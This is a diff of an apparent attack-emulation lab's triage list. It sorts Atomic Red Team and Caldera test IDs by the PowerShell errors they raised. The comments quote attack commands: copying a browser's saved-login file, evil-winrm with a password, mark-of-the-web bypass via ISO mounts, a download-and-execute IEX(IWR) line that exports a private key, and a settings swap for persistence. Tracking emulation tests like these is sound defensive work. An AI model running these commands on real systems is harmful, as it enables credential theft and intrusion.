FullyQualifiedErrorId : CommandNotFoundException Get-ADGroupMember : The term \'Get-ADGroupMember\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:126+ ... ainTrust; Get-NetForestTrust; Get-ADDomain; Get-ADGroupMember Adminis ...+                                                 ~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (Get-ADGroupMember:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException Exception calling "GetCurrentDomain" with "0" argument(s): "Current security context is not associated with an Active Directory domain or forest."At line:1 char:171+ ... -Recursive; ([System.DirectoryServices.ActiveDirectory.Domain]::GetCu ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException    + FullyQualifiedErrorId : ActiveDirectoryOperationException ']
+	"atomic_windows_depfalse_pshtrue__t1135__discovery__network_share_discovery__7a87eec9166dd9d24825a4af7bb3bc47", # ['Import-Module : The specified module \'PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\' was not loaded because no valid module file was found in any module directory.At line:1 char:409+ ... .ps1"};  ;  Import-Module "PathToAtomicsFolder\\..\\ExternalPayloads\\Po ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ResourceUnavailable: (PathToAtomicsFo...s\\PowerView.ps1:String) [Import-Module], FileNot    FoundException    + FullyQualifiedErrorId : Modules_ModuleNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand Invoke-ShareFinder : The term \'Invoke-ShareFinder\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:480+ ... Folder\\..\\ExternalPayloads\\PowerView.ps1"; Invoke-ShareFinder -CheckS ...+                                                ~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (Invoke-ShareFinder:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException ']
+
+
+
 
 
 	# Start-Process : This command cannot be run due to the error: The system cannot find the file specified. 
-	"atomic_windows_depfalse_pshtrue__t1059_003__execution__command_and_scripting_interpreter-_windows_command_shell__f5cef6032e9bace6a1938456ac5a5cfb",
-	"atomic_windows_depfalse_pshtrue__t1055__multiple__process_injection__ce67d9c1b111032ddb8a56363c854fdc",
-	"atomic_windows_depfalse_pshtrue__t1055__multiple__process_injection__4abdd4cce7c4aa8a3804a6f5ff365514",
-	"atomic_windows_depfalse_pshtrue__t1055_003__multiple__thread_execution_hijacking__6a64ea6e29cdb83d468a27d6f69960cb",
+	"atomic_windows_depfalse_pshtrue__t1059_003__execution__command_and_scripting_interpreter-_windows_command_shell__f5cef6032e9bace6a1938456ac5a5cfb", # ['Start-Process : This command cannot be run due to the error: The system cannot find the file specified.At line:1 char:1+ Start-Process "PathToAtomicsFolder\\..\\ExternalPayloads\\T1059.003_scri ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException    + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcessCommand ']
+	"atomic_windows_depfalse_pshtrue__t1055__multiple__process_injection__ce67d9c1b111032ddb8a56363c854fdc", # ['Start-Process : This command cannot be run due to the error: The system cannot find the file specified.At line:1 char:1+ Start-Process "$PathToAtomicsFolder\\T1055\\bin\\x64\\redVanity.exe" (Sta ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException    + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcessCommand ']
+	"atomic_windows_depfalse_pshtrue__t1055__multiple__process_injection__4abdd4cce7c4aa8a3804a6f5ff365514", # ['Start-Process : This command cannot be run due to the error: The system cannot find the file specified.At line:1 char:45+ ...  -passthru; Start-Process "$PathToAtomicsFolder\\T1055\\bin\\x64\\InjectV ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException    + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcessCommand ']
+	"atomic_windows_depfalse_pshtrue__t1055_003__multiple__thread_execution_hijacking__6a64ea6e29cdb83d468a27d6f69960cb", # ['Start-Process : This command cannot be run due to the error: The system cannot find the file specified.At line:1 char:45+ ...  -passthru; Start-Process "$PathToAtomicsFolder\\T1055.003\\bin\\InjectC ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException    + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcessCommand ']
+	"atomic_windows_depfalse_pshtrue__t1219__command-and-control__remote_access_software__e0e717c540d5e8ff24f00b7434626f7e", # ['Start-Process : This command cannot be run due to the error: The system cannot find the file specified.At line:1 char:1+ Start-Process "PathToAtomicsFolder\\..\\ExternalPayloads\\RemotePC.exe"+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException    + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcessCommand ']
+	"atomic_windows_depfalse_pshtrue__t1219__command-and-control__remote_access_software__d21a964d09837abede8966daf6ae46cf", # ['Start-Process : This command cannot be run due to the error: The system cannot find the file specified.At line:1 char:1+ Start-Process -Wait -FilePath "PathToAtomicsFolder\\..\\ExternalPayload ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException    + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcessCommand Start-Process : This command cannot be run due to the error: The system cannot find the file specified.At line:1 char:126+ ...  -PassThru; Start-Process \'C:\\Program Files (x86)\\UltraViewer\\UltraVi ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException    + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcessCommand ']
+	"atomic_windows_depfalse_pshtrue__t1219__command-and-control__remote_access_software__396dae93ab07f7c93853def404fefebf", # ['Start-Process : This command cannot be run due to the error: The system cannot find the file specified.At line:1 char:1+ Start-Process "PathToAtomicsFolder\\..\\ExternalPayloads\\T1219_NetSuppo ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException    + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcessCommand ']
+	"atomic_windows_depfalse_pshtrue__t1219__command-and-control__remote_access_software__9e1358e1b78af4bf86bab2334485a015", # ['Start-Process : This command cannot be run due to the error: The system cannot find the file specified.At line:1 char:1+ Start-Process "PathToAtomicsFolder\\..\\ExternalPayloads\\ammyy.exe"+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException    + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcessCommand ']
+	"atomic_windows_depfalse_pshtrue__t1134_001__multiple__access_token_manipulation-_token_impersonation,theft__81289b3d78d06c14b816f7644b1d9f8b", # ['Start-Process : This command cannot be run due to the error: The system cannot find the file specified.At line:1 char:1+ Start-Process "PathToAtomicsFolder\\..\\ExternalPayloads\\NSudo_8.2_All_ ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException    + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcessCommand ']
+	"atomic_windows_depfalse_pshtrue__t1083__discovery__file_and_directory_discovery__abc280f400f218aa1f4d5efe3c9e8228", # ['Start-Process : This command cannot be run due to the error: The system cannot find the file specified.At line:1 char:1+ Start-Process "PathToAtomicsFolder\\..\\ExternalPayloads\\DirLister.exe" ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException    + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcessCommand Stop-Process : Cannot find a process with the name "DirLister". Verify the process name and call the cmdlet again.At line:1 char:95+ ... DirLister.exe"; Start-Sleep -Second 4; Stop-Process -Name "DirLister"+                                            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (DirLister:String) [Stop-Process], ProcessCommandException    + FullyQualifiedErrorId : NoProcessFoundForGivenName,Microsoft.PowerShell.Commands.StopProcessCommand ']
+
 
 	# The term <X> is not recognized as the name of a cmdlet, function, script file, or operable program. 
 	#  Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:398+ ... ps1"};  ;  
 	# &"$PathToAtomicsFolder\\<Y>"
-	"atomic_windows_depfalse_pshtrue__t1056_001__multiple__input_capture-_keylogging__a18a0e98b9566d92a1611a2da69b413b",
-	"atomic_windows_depfalse_pshtrue__t1055_012__multiple__process_injection-_process_hollowing__5fef676a9954938537bd1e2191d3e9b5",
+	"atomic_windows_depfalse_pshtrue__t1056_001__multiple__input_capture-_keylogging__a18a0e98b9566d92a1611a2da69b413b", # ['& : The term \'\\T1056.001\\src\\Get-Keystrokes.ps1\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:398+ ... ps1"};  ;  &"$PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1" - ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (\\T1056.001\\src\\Get-Keystrokes.ps1:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException ']
+	"atomic_windows_depfalse_pshtrue__t1055_012__multiple__process_injection-_process_hollowing__5fef676a9954938537bd1e2191d3e9b5", # ['. : The term \'\\T1055.012\\src\\Start-Hollow.ps1\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:3+ . "$PathToAtomicsFolder\\T1055.012\\src\\Start-Hollow.ps1"; $ppid=Get-Pr ...+   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (\\T1055.012\\src\\Start-Hollow.ps1:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException Start-Hollow : The term \'Start-Hollow\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:106+ ...  $ppid=Get-Process explorer | select -expand id; Start-Hollow -Sponso ...+                                                      ~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (Start-Hollow:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException ']
+	"atomic_windows_depfalse_pshtrue__t1134_004__multiple__access_token_manipulation-_parent_pid_spoofing__a515bb54fd6e14b78297814875f3c73b", # ['. : The term \'\\T1134.004\\src\\PPID-Spoof.ps1\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:3+ . "$PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1"; $ppid=Get-Proc ...+   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (\\T1134.004\\src\\PPID-Spoof.ps1:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException PPID-Spoof : The term \'PPID-Spoof\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:104+ ... "; $ppid=Get-Process explorer | select -expand id; PPID-Spoof -ppid $ ...+                                                        ~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (PPID-Spoof:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException ']
+	"atomic_windows_depfalse_pshtrue__t1134_002__multiple__create_process_with_token__163fd8a878476002c604d0fe4e32a419",  # ['& : The term \'\\T1134.002\\src\\GetToken.ps1\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:213+ ... ing()]}}; & "$PathToAtomicsFolder\\T1134.002\\src\\GetToken.ps1"; [MyPro ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (\\T1134.002\\src\\GetToken.ps1:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException Unable to find type [MyProcess].At line:1 char:264+ ... $PathToAtomicsFolder\\T1134.002\\src\\GetToken.ps1"; [MyProcess]::Create ...+                                                       ~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (MyProcess:TypeName) [], RuntimeException    + FullyQualifiedErrorId : TypeNotFound ']
 
 
-]
-# TODO -- 세분화
-# those that which are not related to 'PathToAtomicsFolder''
+	# ETC
+	"atomic_windows_depfalse_pshtrue__t1574_008__multiple__hijack_execution_flow-_path_interception_by_search_order_hijacking__e538e0ff74962aaf1dbd08baa5c7853f", # ["Microsoft (R) Visual C# Compiler version 4.8.4084.0\rfor C# 5Copyright (C) Microsoft Corporation. All rights reserved.\r\rThis compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240error CS2001: Source file 'PathToAtomicsFolder\\T1574.008\\bin\\calc.cs' could not be foundwarning CS2008: No source files specifiedWindows PowerShellCopyright (C) Microsoft Corporation. All rights reserved.Try the new cross-platform PowerShell https://aka.ms/pscore6PS C:\\Users\\puma-4\\Desktop> "]
+
+
+],
+
+
+# ===============================================================================================================================================================
+
+# [ Prioritize in fixing ]
+# TODO -- 세분화 + 'STDERR or STDOUT' AND 'COMMAND' COPY-PASTE
+# those that which are NOT related to 'PathToAtomicsFolder''
 "Cannot find path <FILE or Folder>": [
-	"stockpile_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__3864fd22-5c63-41c9-bdbc-a66b5ffa3f5e',
-	"atomic_windows_depfalse_pshtrue__t1572__command-and-control__protocol_tunneling__45f462c09f28d5b0819af7b1ed0913e1",
-	"atomic_windows_depfalse_pshtrue__t1572__command-and-control__protocol_tunneling__6e214f0f17e5d4988aa1085ad4291f46",
-	"atomic_windows_depfalse_pshtrue__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__1cca72410c2849070d833700fcc30c59",
-	"atomic_windows_depfalse_pshtrue__t1553_005__defense-evasion__subvert_trust_controls-_mark-of-the-web_bypass__d2e0c0165046372fcd5e2bf910eeb477",
-	"atomic_windows_depfalse_pshtrue__t1553_005__defense-evasion__subvert_trust_controls-_mark-of-the-web_bypass__9b3194cc656092b09f4d79ba3d3a3277",
+	"atomic_windows_depfalse_pshtrue__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__1cca72410c2849070d833700fcc30c59", # STDERR/STDOUT: ['Copy-Item : Cannot find path \'C:\\Users\\puma-4\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data\' because it does not exist.At line:1 char:1+ Copy-Item "$env:APPDATA\\Opera Software\\Opera Stable\\Login Data" -Dest ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...able\\Login Data:String) [Copy-Item], ItemNotFoundExce    ption    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand ']
+																																										# COMMAND: ['Copy-Item "$env:APPDATA\\Opera Software\\Opera Stable\\Login Data" -Destination "PathToAtomicsFolder\\..\\ExternalPayloads"']
+
+	"atomic_windows_depfalse_pshtrue__t1553_005__defense-evasion__subvert_trust_controls-_mark-of-the-web_bypass__d2e0c0165046372fcd5e2bf910eeb477", # ['Mount-DiskImage : The system cannot find the file specified. At line:1 char:1+ Mount-DiskImage -ImagePath "053c10_AllTheThings.iso" -StorageType ISO ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (MSFT_DiskImage:ROOT/Microsoft/.../MSFT_DiskImage) [Mount-DiskImage], Ci    mException    + FullyQualifiedErrorId : HRESULT 0x80070002,Mount-DiskImage Get-Volume : No MSFT_Volume objects found with property \'FileSystemLabel\' equal to \'AllTheThings\'.  Verify the value of the property and retry.At line:1 char:97+ ...  ReadOnly; $keep = Get-Volume -FileSystemLabel "AllTheThings"; $drive ...+                        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (AllTheThings:String) [Get-Volume], CimJobException    + FullyQualifiedErrorId : CmdletizationQuery_NotFound_FileSystemLabel,Get-Volume ']
+																																					 # ['Mount-DiskImage -ImagePath "053c10_AllTheThings.iso" -StorageType ISO -Access ReadOnly; $keep = Get-Volume -FileSystemLabel "AllTheThings"; $driveLetter = ($keep | Get-Volume).DriveLetter; $instance = [activator]::CreateInstance([type]::GetTypeFromCLSID("{c08afd90-f2a1-11d1-8455-00a0c91f3880}")); $instance.Document.Application.ShellExecute($driveLetter+":\\document.lnk","",$driveLetter+":\\",$null,0)']
+
+	"atomic_windows_depfalse_pshtrue__t1553_005__defense-evasion__subvert_trust_controls-_mark-of-the-web_bypass__9b3194cc656092b09f4d79ba3d3a3277", # ['Mount-DiskImage : The system cannot find the file specified. At line:1 char:1+ Mount-DiskImage -ImagePath "0f959a_FeelTheBurn.iso" -StorageType ISO  ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (MSFT_DiskImage:ROOT/Microsoft/.../MSFT_DiskImage) [Mount-DiskImage], Ci    mException    + FullyQualifiedErrorId : HRESULT 0x80070002,Mount-DiskImage Get-Volume : No MSFT_Volume objects found with property \'FileSystemLabel\' equal to \'TestIso\'.  Verify the value of the property and retry.At line:1 char:96+ ... ccess ReadOnly; $keep = Get-Volume -FileSystemLabel "TestIso"; $drive ...+                             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (TestIso:String) [Get-Volume], CimJobException    + FullyQualifiedErrorId : CmdletizationQuery_NotFound_FileSystemLabel,Get-Volume invoke-item : Cannot find path \'C:\\Users\\puma-4\\Desktop\\:\\hello.exe\' because it does not exist.At line:1 char:184+ ... p | Get-Volume).DriveLetter; invoke-item "$($driveLetter):\\hello.exe"+                                  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4\\Desktop\\:\\hello.exe:String) [Invoke-Item], ItemNotFound    Exception    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.InvokeItemCommand ']
+																																					 # ['Mount-DiskImage -ImagePath "0f959a_FeelTheBurn.iso" -StorageType ISO -Access ReadOnly; $keep = Get-Volume -FileSystemLabel "TestIso"; $driveLetter = ($keep | Get-Volume).DriveLetter; invoke-item "$($driveLetter):\\hello.exe"']
+
 	"atomic_windows_depfalse_pshtrue__t1553_005__defense-evasion__subvert_trust_controls-_mark-of-the-web_bypass__7f0f5471543a6f188b0fbdc436c49fd9", # I think solvable
-	"atomic_windows_depfalse_pshtrue__t1553_005__defense-evasion__subvert_trust_controls-_mark-of-the-web_bypass__3c9dee6c65974cc3b4f34d0a5d1b6992",
-	"atomic_windows_depfalse_pshtrue__t1553_004__defense-evasion__subvert_trust_controls-_install_root_certificate__2cdcf1010a524231a26b5f3c6025eb91",
-	"atomic_windows_depfalse_pshtrue__t1552_004__credential-access__unsecured_credentials-_private_keys__000549902a51ef21f57d3d28a6e5ecc0",
-	"atomic_windows_depfalse_pshtrue__t1547_015__multiple__boot_or_logon_autostart_execution-_login_items__01a2ad691dfb47b11d050fab371718d2",
-	"atomic_windows_depfalse_pshtrue__t1546_013__multiple__event_triggered_execution-_powershell_profile__49a7502f9c667aa3af9c87f6ab1e68b3",
-	"atomic_windows_depfalse_pshtrue__t1486__impact__data_encrypted_for_impact__f22a27383f804337af8e690aae594d97",
-	"atomic_windows_depfalse_pshtrue__t1133__multiple__external_remote_services__ff4e1ea516f781a6ef93323ba9dfac0a", # also chrome related
-	"atomic_windows_depfalse_pshtrue__t1070_004__defense-evasion__indicator_removal_on_host-_file_deletion__04858322bc6cd08282f2ce96cab5ee7c",
-	"atomic_windows_depfalse_pshtrue__t1070_004__defense-evasion__indicator_removal_on_host-_file_deletion__36aa805044ab4f4d7f6f372a46c8bab2",
-	"atomic_windows_depfalse_pshtrue__t1055_011__multiple__process_injection-_extra_window_memory_injection__a8a3487e477e0c1501ceb0239b5cad15",
+																																					 # ["Unblock-File : Cannot find path 'C:\\Users\\puma-4\\AppData\\Local\\Temp\\ReadMe.md' because it does not exist.At line:1 char:1+ Unblock-File -Path $env:tmp\\ReadMe.md+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...\\Temp\\ReadMe.md:String) [Unblock-File], ItemNotFoundE    xception    + FullyQualifiedErrorId : FileNotFound,Microsoft.PowerShell.Commands.UnblockFileCommand "]
+																																					 # ['Unblock-File -Path $env:tmp\\ReadMe.md']
 
-	"atomic_windows_depfalse_pshtrue__t1039__collection__data_from_network_shared_drive__73fed1f32224461748c3630217b7d300",
+	"atomic_windows_depfalse_pshtrue__t1553_005__defense-evasion__subvert_trust_controls-_mark-of-the-web_bypass__3c9dee6c65974cc3b4f34d0a5d1b6992", # ['Mount-DiskImage : The system cannot find the file specified. At line:1 char:1+ Mount-DiskImage -ImagePath "5fad3e_T1553.005.iso"+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (MSFT_DiskImage:ROOT/Microsoft/.../MSFT_DiskImage) [Mount-DiskImage], Ci    mException    + FullyQualifiedErrorId : HRESULT 0x80070002,Mount-DiskImage ']
+																																					 # ['Mount-DiskImage -ImagePath "5fad3e_T1553.005.iso"']
 
-	"atomic_windows_depfalse_pshtrue__t1027_004__defense-evasion__obfuscated_files_or_information-_compile_after_delivery__55b2c04e70a5711957e264b04e645e91",
-	"atomic_windows_depfalse_pshtrue__t1021_006__lateral-movement__remote_services-_windows_remote_management__dce08779676c01d98885e164a1176ac8", # ['evil-winrm -i Target -u Domain\\Administrator -p P@ssw0rd1']
- 
-	"atomic_windows_depfalse_pshtrue__t1003_001__credential-access__os_credential_dumping-_lsass_memory__8e01631039faf6a9a84df376bf9ad0f1", # Cannot find path \'C:\\Program Files\\dotnet\\shared\\Microsoft.NETCore.App\' because it does not exist.
+	"atomic_windows_depfalse_pshtrue__t1553_004__defense-evasion__subvert_trust_controls-_install_root_certificate__2cdcf1010a524231a26b5f3c6025eb91", # ['certutil -addstore my $env:Temp\\rootCA2.cer']
+																																					   # ['Creates a root CA with certutil\n']
 
-],
-# TODO -- 세분화
-"Cannot find path <REGISTRY>" : [
-	"atomic_windows_depfalse_pshtrue__t1562_004__defense-evasion__impair_defenses-_disable_or_modify_system_firewall__986876c6024765475043100f9e080fc8",
-	"atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__cb6e6c7e18aba2207c696368f8edb23a",
-	"atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__b66a6eed7d46ab2ca4c3bf1ae3b61f44",
-	"atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__4df316c222125fe7372723c5b3434977",
-	"atomic_windows_depfalse_pshtrue__t1547_014__multiple__active_setup__7ad5840a79f3259965fa28835dda93c4",
-	"atomic_windows_depfalse_pshtrue__t1546_011__multiple__event_triggered_execution-_application_shimming__ed65658e4431bc3b636dd0de29bf8e35",
-	"atomic_windows_depfalse_pshtrue__t1204_002__execution__user_execution-_malicious_file__a45769d74eb1c75ff916b121023bde31", # Excel related
-	"atomic_windows_depfalse_pshtrue__t1112__defense-evasion__modify_registry__86993ae14d75a6da421c0d98c3facd61",
-],
-
-"Property Security Packages does not exist at path <X>": [
-	"atomic_windows_depfalse_pshtrue__t1547_005__multiple__boot_or_logon_autostart_execution-_security_support_provider__cc5347b500dfbdbb96b1fdb6a0669708",
+	"atomic_windows_depfalse_pshtrue__t1552_004__credential-access__unsecured_credentials-_private_keys__000549902a51ef21f57d3d28a6e5ecc0",			 # ['Root "Trusted Root Certification Authorities"================ Certificate 9 ================Serial Number: 52761736eea4458142453e2d73fa89b2Issuer: CN=Microsoft Root Certificate Authority 2010, O=Microsoft Corporation, L=Redmond, S=Washington, C=US NotBefore: 12/1/2017 4:55 PM NotAfter: 12/1/2042 12:06 AMSubject: CN=Microsoft Root Certificate Authority 2010, O=Microsoft Corporation, L=Redmond, S=Washington, C=USSignature matches Public KeyRoot Certificate: Subject matches IssuerCert Hash(sha1): 1f3d38f280635f275be92b87cf83e40e40458400No key provider informationCannot find the certificate and private key for decryption.CertUtil: -exportPFX command FAILED: 0x80070003 (WIN32: 3 ERROR_PATH_NOT_FOUND)CertUtil: The system cannot find the path specified.ReturnValue PSComputerName----------- --------------          0                         0               ']
+																																					 # ["IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) ; certutil.exe -p password -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 c:\\temp\\atomic.pfx"]
 	
+	"atomic_windows_depfalse_pshtrue__t1547_015__multiple__boot_or_logon_autostart_execution-_login_items__01a2ad691dfb47b11d050fab371718d2", # ['mv : Cannot find path \'C:\\Users\\puma-4\\AppData\\Local\\Packages\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\LocalState\\settings.json\' because it does not exist.At line:1 char:1+ mv ~\\AppData\\Local\\Packages\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\L ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...e\\settings.json:String) [Move-Item], ItemNotFoundExce    ption    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.MoveItemCommand Invoke-WebRequest : Could not find a part of the path \'C:\\Users\\puma-4\\AppData\\Local\\Packages\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\LocalState\\settings.json\'.At line:1 char:130+ ... tings.json; Invoke-WebRequest "https://github.com/redcanaryco/atomic- ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : NotSpecified: (:) [Invoke-WebRequest], DirectoryNotFoundException    + FullyQualifiedErrorId : System.IO.DirectoryNotFoundException,Microsoft.PowerShell.Commands.InvokeWebRequestComma    nd wt.exe : The term \'wt.exe\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:356+ ... osoft.WindowsTerminal_8wekyb3d8bbwe\\LocalState\\settings.json"; wt.exe+                                                                    ~~~~~~    + CategoryInfo          : ObjectNotFound: (wt.exe:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException ']
+																																			  #  ['mv ~\\AppData\\Local\\Packages\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\LocalState\\settings.json ~\\AppData\\Local\\Temp\\settings.json; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/src/settings.json?raw=true" -OutFile "~\\AppData\\Local\\Packages\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\LocalState\\settings.json"; wt.exe']
+
